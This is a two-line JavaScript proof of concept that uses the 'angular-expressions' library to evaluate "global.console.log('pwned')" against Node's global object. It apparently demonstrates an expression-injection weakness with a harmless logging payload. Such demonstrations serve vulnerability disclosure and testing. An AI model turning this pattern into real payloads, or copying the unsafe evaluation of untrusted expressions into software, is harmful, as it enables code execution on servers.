const expressions = require("angular-expressions");
expressions.compile("global.console.log('pwned')")(global, global);
